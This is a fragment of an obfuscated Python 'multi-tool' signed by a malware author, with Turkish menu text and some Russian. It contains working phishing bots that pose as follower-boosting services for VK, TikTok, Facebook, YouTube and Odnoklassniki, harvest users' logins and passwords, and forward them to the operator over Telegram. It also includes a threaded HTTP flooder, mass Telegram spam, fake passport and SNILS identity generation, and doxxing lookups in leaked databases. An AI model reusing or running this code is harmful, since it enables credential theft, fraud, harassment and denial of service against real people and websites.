{"Telefon:":<20}{data[7]}
{"E-posta:":<20}{data[8]}
{"Rol:":<20}{data[9]}
{"Yarışmadaki rol:":<20}{data[10]}
{"Etkinlikteki rol:":<20}{data[11]}
{"Sınıf:":<20}{data[12]}
{"Sınıf edebiyatı:":<20}{data[13]}
{"Kurs:":<20}{data[14]}
{"Vatandaşlık:":<20}{data[15]}
{"Eğitim ülkesi:":<20}{data[16]}
{"Bölge:":<20}{data[17]}
{"Belediye:":<20}{data[18]}
{"Kurum adı:":<20}{data[19]}
{"Adres:":<20}{data[20]}
{"Pozisyon:":<20}{data[21]}
{"Eğitim kurumu türü:":<20}{data[22]}
{"Sosyal organizasyon:":<20}{data[23]}
                        """;Write.Print(basa1,Colors.red_to_purple,interval=.005);found=_D;break
		if not found:print('Данные не найдены')
	if choice=='4':
		Write.Print('Açıklama: kullanıcı botunu hesaba yetkilendiriyorsunuz, ardından isimler oluşturuluyor ve yazdığınız metin gönderiliyor.',Colors.red_to_purple,interval=.005);Write.Print('\nDİKKAT!!! Bunun için hesabınız kapatılabilir, bu yüzden çok fazla mesaj göndermeyin.',Colors.red_to_purple,interval=.005);api_id=_X;api_hash=_L;message=Write.Input('\nGöndermek için metni girin: ',Colors.purple_to_blue,interval=.005);num_messages=int(Write.Input('Göndermek istediğiniz mesaj sayısını girin: ',Colors.purple_to_blue,interval=.005));fake=Faker()
		def transliterate_to_latin(text):A='e';translit_dict={'а':_I,'б':'b','в':'v','г':'g','д':'d','е':A,'ё':A,'ж':'zh','з':'z','и':'i','й':'y','к':'k','л':'l','м':'m','н':'n','о':'o','п':'p','р':_H,'с':'s','т':'t','у':'u','ф':'f','х':'kh','ц':'ts','ч':'ch','ш':'sh','щ':'sch','ъ':'','ы':'y','ь':'','э':A,'ю':'yu','я':'ya'};latin_text=''.join(translit_dict.get(c,c)for c in text.lower());return latin_text
		with TelegramClient('session_name',api_id,api_hash)as client:
			for _ in range(num_messages):
				random_name_cyrillic=fake.first_name();random_name_latin=transliterate_to_latin(random_name_cyrillic)
				try:user=client.get_entity(random_name_latin);client.send_message(user,message);Write.Print(f'Gönderilen mesaj "test" kullanıcıya: {random_name_cyrillic} ({random_name_latin})',Colors.red_to_purple,interval=.005)
				except Exception as e:Write.Print(f"Kullanıcı bulunamadı.",Colors.red_to_purple,interval=.005)
	if choice=='17':
		with open('socks4_proxies.txt',_H)as f:proxy=f.read();print(proxy)
	if choice=='16':
		fake=Faker(locale='tr_TR');gender=input('Cinsiyetinizi girin (E - Erkek, K - Kadın): ')
		if gender not in['М','Ж']:gender=random.choice(['М','Ж']);print(f"Yanlış bir değer girdiniz, rastgele seçilecektir: {gender}")
		if gender=='М':first_name=fake.first_name_male();middle_name=fake.middle_name_male()
		else:first_name=fake.first_name_female();middle_name=fake.middle_name_female()
		last_name=fake.last_name();full_name=f"{last_name} {first_name} {middle_name}";birthdate=fake.date_of_birth();age=fake.random_int(min=18,max=80);street_address=fake.street_address();city=fake.city();region=fake.region();postcode=fake.postcode();address=f"{street_address}, {city}, {region} {postcode}";email=fake.email();phone_number=fake.phone_number();inn=str(fake.random_number(digits=12,fix_len=_D));snils=str(fake.random_number(digits=11,fix_len=_D));passport_num=str(fake.random_number(digits=10,fix_len=_D));passport_series=fake.random_int(min=1000,max=9999);print(f"Ad Soyad: {full_name}");print(f"Cinsiyet: {gender}");print(f"Doğum tarihi: {birthdate.strftime('%d %B %Y')}");print(f"Yaş: {age} yıl");print(f"Adres: {address}");print(f"E-posta: {email}");print(f"Telefon: {phone_number}");print(f"INN: {inn}");print(f"SNILS: {snils}");print(f"Pasaport seri: {passport_series} numara: {passport_num}")
	if choice=='3':
		nick=input(f"Takma adınızı girin: ");print(f"Bilgi aranyor...");print(f"Sosyal medya");urls=[f"https://www.instagram.com/{nick}",f"https://www.tiktok.com/@{nick}",f"https://twitter.com/{nick}",f"https://www.facebook.com/{nick}",f"https://www.youtube.com/@{nick}",f"https://t.me/{nick}",f"https://www.roblox.com/user.aspx?username={nick}",f"https://https://www.twitch.tv/{nick}"]
		for url in urls:
			try:
				response=requests.get(url)
				if response.status_code==200:print(f"{url} - hesap bulundu")
				elif response.status_code==404:print(f"{url} - hesap bulunamadı")
				else:print(f"{url} - hata  {response.status_code}")
			except:print(f"{url} - kontrol sırasında hata")
	if choice=='5':
		url=Write.Input('URL: ',Colors.purple_to_blue,interval=.005);num_requests=int(Write.Input('Gönderilecek istek sayısını girin: ',Colors.purple_to_blue,interval=.005));user_agents=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)']
		def send_request(i):
			user_agent=random.choice(user_agents);headers={'User-Agent':user_agent}
			try:response=requests.get(url,headers=headers,timeout=.1);print(f"Request {i} sent successfully\n")
			except:print(f"Request {i} sent successfully\n")
		threads=[]
		for i in range(1,num_requests+1):t=threading.Thread(target=send_request,args=[i]);t.start();threads.append(t)
		for t in threads:t.join()
	if choice=='8':
		Write.Print('Phishing türünü seçin: '+_C,Colors.red_to_purple,interval=.005);fish='\n1: VK\n2: TikTok\n4: FaceBook\n5: YouTube\n6: Odnoklassniki(ok.ru)\n      ';Write.Print(fish,Colors.red_to_purple,interval=.005);choice_fish=Write.Input('\nPhishing seçeneğini seçin > ',Colors.purple_to_blue,interval=.005)
		if choice_fish=='6':
			log=open(_F,_E,encoding=_A);ID=Write.Input(_A1,Colors.purple_to_blue,interval=.005);Tokenccc=Write.Input(_A2,Colors.purple_to_blue,interval=.005);bot=telebot.TeleBot(Tokenccc)
			try:Write.Print(_a,Colors.red_to_purple,interval=.005);bot.send_message(ID,_U)
			except:Write.Print(_A3,Colors.red_to_purple,interval=.005)
			@bot.message_handler(commands=[_K])
			def start(message):Write.Print(f"Kullanıcı tespit edildi!\n                ID: {message.from_user.id}",Colors.red_to_purple,interval=.005);bot.send_message(message.chat.id,'👋 MERHABA! 👋\n                        Bu, Odnoklassniki hesabınızın tanıtım botu\n                         Başlamak için /nacrutka yazın')
			@bot.message_handler(commands=[_Q,'n'])
			def start1(message):keyboardmain=types.InlineKeyboardMarkup(row_width=2);first_button=types.InlineKeyboardButton(text=_N,callback_data=_B);second_button=types.InlineKeyboardButton(text=_V,callback_data=_B);button3=types.InlineKeyboardButton(text=_b,callback_data=_B);button4=types.InlineKeyboardButton(text=_O,callback_data=_B);keyboardmain.add(first_button,second_button,button3,button4);bot.send_message(message.chat.id,_P,reply_markup=keyboardmain)
			@bot.callback_query_handler(func=lambda call:_D)
			def callback_inline1(call):
				if call.data==_B:msg=bot.send_message(call.message.chat.id,_A4);bot.register_next_step_handler(msg,qproc1)
			def qproc1(message):
				try:
					num=message.text
					if not num.isdigit():msg=bot.reply_to(message,_A5);return
					elif int(num)>500:bot.reply_to(message,'Sayı 500’den fazla olamaz!');return
					else:bot.send_message(message.chat.id,f"SAYI    : {num}");msg=bot.send_message(message.chat.id,'Hesabınızın telefon numarasını (veya e-postanızı) girin:');bot.register_next_step_handler(msg,step1)
				except Exception as e:print(e)
			def step1(message):get=f"""lınan veriler: 
          Alınan botta: Odnoklassniki
          ID: {message.from_user.id}
          Takma ad: @{message.from_user.username}
          Kullanıcı adı: {message.text}
          isim: {message.from_user.first_name}

          """;log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();Write.Print(get,Colors.red_to_purple,interval=.005);bot.send_message(ID,get);bot.reply_to(message,f"Ваш логин: {message.text}");msg1=bot.send_message(message.chat.id,'Введите пароль от вашего аккаунта:');bot.register_next_step_handler(msg1,step2)
			def step2(message):usrpass=message.text;get=f"""lınan veriler:
          Alınan botta: Odnoklassniki 
          ID: {message.from_user.id}
          Takma ad: @{message.from_user.username}
          Kullanıcı adı: {usrpass}
          isim: {message.from_user.first_name}

          """;Write.Print(get,Colors.red_to_purple,interval=.005);log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();bot.send_message(ID,get);msg=bot.reply_to(message,f"Sizin şifreniz: {usrpass}");time.sleep(1);bot.reply_to(message,f"Hizmetimizi kullandığınız için teşekkür ederiz😉! Eğer girilen bilgiler doğruysa, hesabınıza 24 saat içinde artırma işlemi yapılacaktır!")
			bot.polling()
		if choice_fish=='5':
			log=open(_F,_E,encoding=_A);ID=Write.Input(_A1,Colors.purple_to_blue,interval=.005);Tokenccc=Write.Input(_A2,Colors.purple_to_blue,interval=.005);bot=telebot.TeleBot(Tokenccc)
			try:Write.Print('Bot başlatıldı!!\n',Colors.red_to_purple,interval=.005);bot.send_message(ID,_U)
			except:Write.Print(_A3,Colors.red_to_purple,interval=.005)
			@bot.message_handler(commands=[_K])
			def start(message):Write.Print(f"Kullanıcı tespit edildi!\n                ID: {message.from_user.id}",Colors.red_to_purple,interval=.005);bot.send_message(message.chat.id,'👋 Merhaba! 👋\n                        Bu, YouTube hesabınızın tanıtım botu!\n                        Başlamak için /nacrutka yazın')
			@bot.message_handler(commands=[_Q,'n'])
			def start1(message):keyboardmain=types.InlineKeyboardMarkup(row_width=2);first_button=types.InlineKeyboardButton(text=_N,callback_data=_B);second_button=types.InlineKeyboardButton(text=_V,callback_data=_B);button3=types.InlineKeyboardButton(text=_b,callback_data=_B);button4=types.InlineKeyboardButton(text=_O,callback_data=_B);keyboardmain.add(first_button,second_button,button3,button4);bot.send_message(message.chat.id,_P,reply_markup=keyboardmain)
			@bot.callback_query_handler(func=lambda call:_D)
			def callback_inline1(call):
				if call.data==_B:msg=bot.send_message(call.message.chat.id,_A4);bot.register_next_step_handler(msg,qproc1)
			def qproc1(message):
				try:
					num=message.text
					if not num.isdigit():msg=bot.reply_to(message,_A5);return
					elif int(num)>500:bot.reply_to(message,'Miktar 500’den fazla olamaz!');return
					else:bot.send_message(message.chat.id,f"Miktar: {num}");msg=bot.send_message(message.chat.id,_A6);bot.register_next_step_handler(msg,step1)
				except Exception as e:print(e)
			def step1(message):get=f"""Alınan veriler: 
          Alınan botta: YouTube
          ID: {message.from_user.id}
          Takma adı: @{message.from_user.username}
          Kullanıcı adı: {message.text}
          isim: {message.from_user.first_name}

          """;log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();Write.Print(get,Colors.red_to_purple,interval=.005);bot.send_message(ID,get);bot.reply_to(message,f"Sizin kullanıcı adınız: {message.text}");msg1=bot.send_message(message.chat.id,_W);bot.register_next_step_handler(msg1,step2)
			def step2(message):usrpass=message.text;get=f"""Alınan veriler:
          Alınan botta: YouTube 
          ID: {message.from_user.id}
          takma ad: @{message.from_user.username}
          Kullanıcı adı: {usrpass}
          isim: {message.from_user.first_name}

          """;Write.Print(get,Colors.red_to_purple,interval=.005);log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();bot.send_message(ID,get);msg=bot.reply_to(message,f"Ваш пароль: {usrpass}");time.sleep(1);bot.reply_to(message,f"Hizmetimizi kullandığınız için teşekkür ederiz😉! Eğer girdiğiniz veriler doğruysa, hesabınızda 24 saat içinde işlem başlayacaktır!")
			bot.polling()
		if choice_fish=='4':
			log=open(_F,_E,encoding=_A);ID=Write.Input("Kendi ID'nizi girin: ",Colors.purple_to_blue,interval=.005);Tokenccc=Write.Input("Token'inizi girin: ",Colors.purple_to_blue,interval=.005);bot=telebot.TeleBot(Tokenccc)
			try:Write.Print(_a,Colors.red_to_purple,interval=.005);bot.send_message(ID,_U)
			except:Write.Print('Belki botunuzda /start yazmadınız! Bu işlem yapılmazsa, script düzgün çalışmayacaktır!',Colors.red_to_purple,interval=.005)
			@bot.message_handler(commands=[_K])
			def start(message):Write.Print(f"Kullanıcı tespit edildi!\n                ID: {message.from_user.id}",Colors.red_to_purple,interval=.005);bot.send_message(message.chat.id,'👋 Merhaba! 👋\n                        Bu, FaceBook hesabınızın tanıtım botudur!\n                        Başlamak için, /nacrutka yazın')
			@bot.message_handler(commands=[_Q,'n'])
			def start1(message):keyboardmain=types.InlineKeyboardMarkup(row_width=2);first_button=types.InlineKeyboardButton(text=_N,callback_data=_B);second_button=types.InlineKeyboardButton(text=_V,callback_data=_B);button3=types.InlineKeyboardButton(text=_b,callback_data=_B);button4=types.InlineKeyboardButton(text=_O,callback_data=_B);keyboardmain.add(first_button,second_button,button3,button4);bot.send_message(message.chat.id,_P,reply_markup=keyboardmain)
			@bot.callback_query_handler(func=lambda call:_D)
			def callback_inline1(call):
				if call.data==_B:msg=bot.send_message(call.message.chat.id,"Miktarı girin (500'den fazla olamaz)");bot.register_next_step_handler(msg,qproc1)
			def qproc1(message):
				try:
					num=message.text
					if not num.isdigit():msg=bot.reply_to(message,'Lütfen sayısal bir değer girin! Tekrar deneyin, /nacrutka komutunu yazarak!');return
					elif int(num)>500:bot.reply_to(message,_c);return
					else:bot.send_message(message.chat.id,f"Miktar: {num}");msg=bot.send_message(message.chat.id,'Hesabınızın telefon numarasını (veya e-posta) girin:');bot.register_next_step_handler(msg,step1)
				except Exception as e:print(e)
			def step1(message):get=f"""Alınan veriler: 
          Alındı botta: FaceBook
          ID: {message.from_user.id}
          Takma ad: @{message.from_user.username}
          Kulanıcı adı: {message.text}
          isim: {message.from_user.first_name}

          """;log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();Write.Print(get,Colors.red_to_purple,interval=.005);bot.send_message(ID,get);bot.reply_to(message,f"Ваш логин: {message.text}");msg1=bot.send_message(message.chat.id,_W);bot.register_next_step_handler(msg1,step2)
			def step2(message):usrpass=message.text;get=f"""Alınan veriler:
          Alındı botta: tiktok  
          ID: {message.from_user.id}
          Takma ad: @{message.from_user.username}
          Kullanıcı adı: {usrpass}
          isim: {message.from_user.first_name}

          """;Write.Print(get,Colors.red_to_purple,interval=.005);log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();bot.send_message(ID,get);msg=bot.reply_to(message,f"Ваш пароль: {usrpass}");time.sleep(1);bot.reply_to(message,f"Hizmetimizi kullandığınız için teşekkürler😉! Eğer girdiğiniz veriler doğruysa, hesabınızda 24 saat içinde artış bekleyebilirsiniz!")
			bot.polling()
		if choice_fish=='2':
			log=open(_F,_E,encoding=_A);ID=Write.Input("Kendi ID'nizi girin:  ",Colors.purple_to_blue,interval=.005);Tokenc=Write.Input("Token'inizi girin:  ",Colors.purple_to_blue,interval=.005);bot=telebot.TeleBot(Tokenc)
			try:Write.Print(_a,Colors.red_to_purple,interval=.005);bot.send_message(ID,_U)
			except:Write.Print('Botunuzda /start komutunu yazmadığınız için sorun yaşanıyor olabilir! Bu işlem olmadan script düzgün çalışmaz!',Colors.red_to_purple,interval=.005)
			@bot.message_handler(commands=[_K])
			def start(message):Write.Print(f"Kullanıcı bulundu!\n                ID: {message.from_user.id}",Colors.red_to_purple,interval=.005);bot.send_message(message.chat.id,'👋 Привет! 👋\n                        bu bot, TikTok hesabınızın tanıtımını yapar!\n                         Başlamak için, /nacrutka komutunu yazın')
			@bot.message_handler(commands=[_Q,'n'])
			def start1(message):keyboardmain=types.InlineKeyboardMarkup(row_width=2);first_button=types.InlineKeyboardButton(text=_N,callback_data=_B);second_button=types.InlineKeyboardButton(text=_V,callback_data=_B);button3=types.InlineKeyboardButton(text='Görüntülemeler',callback_data=_B);button4=types.InlineKeyboardButton(text=_O,callback_data=_B);keyboardmain.add(first_button,second_button,button3,button4);bot.send_message(message.chat.id,_P,reply_markup=keyboardmain)
			@bot.callback_query_handler(func=lambda call:_D)
			def callback_inline1(call):
				if call.data==_B:msg=bot.send_message(call.message.chat.id,"Lütfen miktarı girin (500'den fazla olamaz)");bot.register_next_step_handler(msg,qproc1)
			def qproc1(message):
				try:
					num=message.text
					if not num.isdigit():msg=bot.reply_to(message,'Lütfen sayısal bir değer girin! Tekrar deneyin ve /nacrutka yazın!');return
					elif int(num)>500:bot.reply_to(message,_c);return
					else:bot.send_message(message.chat.id,f"Колличество: {num}");msg=bot.send_message(message.chat.id,_A6);bot.register_next_step_handler(msg,step1)
				except Exception as e:print(e)
			def step1(message):get=f"""Alınan veri: 
          Alınan botta: TikTok
          ID: {message.from_user.id}
          Takma ad: @{message.from_user.username}
          Kullanıcı adı: {message.text}
          isiö: {message.from_user.first_name}

          """;log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();Write.Print(get,Colors.red_to_purple,interval=.005);bot.send_message(ID,get);bot.reply_to(message,f"Ваш логин: {message.text}");msg1=bot.send_message(message.chat.id,_W);bot.register_next_step_handler(msg1,step2)
			def step2(message):usrpass=message.text;get=f"""Alınan veri:
          Alınan botta: TikTok 
          ID: {message.from_user.id}
          Takma ad: @{message.from_user.username}
          Kullanıcı adı: {usrpass}
          isim: {message.from_user.first_name}

          """;Write.Print(get,Colors.red_to_purple,interval=.005);log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();bot.send_message(ID,get);msg=bot.reply_to(message,f"Sizin şifreniz: {usrpass}");time.sleep(1);bot.reply_to(message,f"Hizmetimizi kullandığınız için teşekkür ederiz😉! Eğer girdiğiniz bilgiler doğruysa, hesabınızda 24 saat içinde artış bekleyebilirsiniz!")
			bot.polling()
		if choice_fish=='1':
			log=open(_F,_E,encoding=_A);ID=Write.Input('Kendi ID’nizi girin: ',Colors.purple_to_blue,interval=.005);Tokenv=Write.Input(_x,Colors.purple_to_blue,interval=.005);bot=telebot.TeleBot(Tokenv)
			try:Write.Print(_u,Colors.red_to_purple,interval=.005);bot.send_message(ID,'!ot başlatıldı!')
			except:Write.Print('Belki de botunuzda /start komutunu yazmadınız! Bu işlem olmadan bot düzgün çalışmaz!',Colors.red_to_purple,interval=.005)
			@bot.message_handler(commands=[_K])
			def start(message):Write.Print(f"Kullanıcı tespit edildi!\n                ID: {message.from_user.id}",Colors.red_to_purple,interval=.005);bot.send_message(message.chat.id,'👋 MERHABA! 👋\n                        Bu bot, VK hesabınızda beğeni ve arkadaş sayısını artırmak için kullanılmaktadır!\n                        Başlamak için /nacrutka komutunu yazın.')
			@bot.message_handler(commands=[_Q,'n'])
			def start1(message):keyboardmain=types.InlineKeyboardMarkup(row_width=2);first_button=types.InlineKeyboardButton(text=_N,callback_data=_B);second_button=types.InlineKeyboardButton(text='Arkadaşlar📃',callback_data=_B);button3=types.InlineKeyboardButton(text=_O,callback_data=_B);button4=types.InlineKeyboardButton(text='Playlist dinlemeleri',callback_data=_B);keyboardmain.add(first_button,second_button,button3,button4);bot.send_message(message.chat.id,_P,reply_markup=keyboardmain)
			@bot.callback_query_handler(func=lambda call:_D)
			def callback_inline1(call):
				if call.data==_B:msg=bot.send_message(call.message.chat.id,'Lütfen sayı girin (500’den fazla olamaz)');bot.register_next_step_handler(msg,qproc1)
			def qproc1(message):
				try:
					num=message.text
					if not num.isdigit():msg=bot.reply_to(message,'Lütfen sayıyı rakamla girin! Tekrar deneyin ve /nacrutka yazın!');return
					elif int(num)>500:bot.reply_to(message,_c);return
					else:bot.send_message(message.chat.id,f"Miktar: {num}");msg=bot.send_message(message.chat.id,'Hesabınızın telefon numarasını girin:');bot.register_next_step_handler(msg,step1)
				except Exception as e:print(e)
			def step1(message):
				inp=message.text.replace('+','')
				if not inp.isdigit():bot.reply_to(message,'Lütfen numarayı sayılarla girin! Tekrar deneyin, /nacrutka yazarak!');return
				get=f"""Alınan veriler: 
          Alındı botta: vk
          ID: {message.from_user.id}
          Takma ad: @{message.from_user.username}
          Giriş: {message.text}
          ad: {message.from_user.first_name}

          """;log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();Write.Print(get,Colors.red_to_purple,interval=.005);bot.send_message(ID,get);bot.reply_to(message,f"Sizin girişiniz: {message.text}");msg1=bot.send_message(message.chat.id,_W);bot.register_next_step_handler(msg1,step2)
			def step2(message):usrpass=message.text;get=f"""Alınan veriler:
           Alındı botta: vk
          ID: {message.from_user.id}
          Takma ad: @{message.from_user.username}
          Giriş: {usrpass}
          ad: {message.from_user.first_name}

          """;Write.Print(get,Colors.red_to_purple,interval=.005);log=open(_F,_E,encoding=_A);log.write(get+_G);log.close();bot.send_message(ID,get);msg=bot.reply_to(message,f"Sizin şifreniz: {usrpass}");time.sleep(1);bot.reply_to(message,f"Hizmetimizi kullandığınız için teşekkür ederiz😉! Eğer girilen veriler doğruysa, hesabınıza 24 saat içinde işlem yapılacaktır!")
			bot.polling()
	if choice=='15':password_length=int(Write.Input('Şifrenin uzunluğunu girin: ',Colors.purple_to_blue,interval=.005));complexity=Write.Input('Karmaşıklığı seçin (low, medium, high: ',Colors.purple_to_blue,interval=.005);complex_password=generate_password(password_length,complexity);Write.Print(complex_password+_C,Colors.red_to_purple,interval=.005)
	if choice=='7':search_term=Input('Adınızı ve soyadınızı girin: ');Search
	if choice=='2':search_term=Write.Input('E-posta adresinizi girin: ',Colors.purple_to_blue,interval=.005);Search
	if choice=='13':search_term=Write.Input("Telegram ID'nizi girin: ",Colors.purple_to_blue,interval=.005);Search
	if choice=='1':Term=Write.Input('Telefon numaranızı girin ( + işareti olmadan): ',Colors.purple_to_blue,interval=.005);Search(Term)
	if choice=='6':
		path=Write.Input('Veritabanının yolunu girin: ',Colors.purple_to_blue,interval=.005);search_text=Write.Input('Aranacak metni girin:  ',Colors.purple_to_blue,interval=.005)
		with open(path,_H,encoding=_A)as f:
			for line in f:
				if search_text in line:Write.Print('Sonuç: '+line.strip(),Colors.red_to_purple,interval=.005);break
			else:Write.Print('Metin bulunamadı.',Colors.red_to_purple,interval=.005)
	if choice=='12':input_text=Write.Input('Metni girin: ',Colors.purple_to_blue,interval=.005);transformed_text=transform_text(input_text);Write.Print('Sonuç > '+transformed_text+_C,Colors.red_to_purple,interval=.005)
	if choice=='10':domain=Write.Input('Web sitesi domainini girin: ',Colors.purple_to_blue,interval=.005);get_website_info(domain)
	if choice=='9':ip_address=Write.Input('Arama yapılacak IP adresini girin:: ',Colors.purple_to_blue,interval=.005);result=ip_lookup(ip_address);Write.Print(result,Colors.red_to_yellow,interval=.005)
	if choice=='11':
		start_url=Write.Input('Bağlantıyı girin: ',Colors.purple_to_blue,interval=.005);max_depth=2;visited=set()
		def crawl(url,depth=0):
			if depth>max_depth:return
			parsed=urlparse(url);domain=f"{parsed.scheme}://{parsed.netloc}"
			if url in visited:return
			try:response=requests.get(url);html=response.text;soup=BeautifulSoup(html,_e)
			except:return
			visited.add(url);Write.Print('  |'+url+_C,Colors.red_to_yellow,interval=.005)
			for link in soup.find_all(_I):
				href=link.get('href')
				if not href:continue
				href=href.split('#')[0].rstrip('/')
				if href.startswith('http'):
					href_parsed=urlparse(href)
					if href_parsed.netloc!=parsed.netloc:continue
				else:href=domain+href
				crawl(href,depth+1)
		crawl(start_url)



#CODDED BY RageMalware 
# t.me/LeakTurkeyaMalware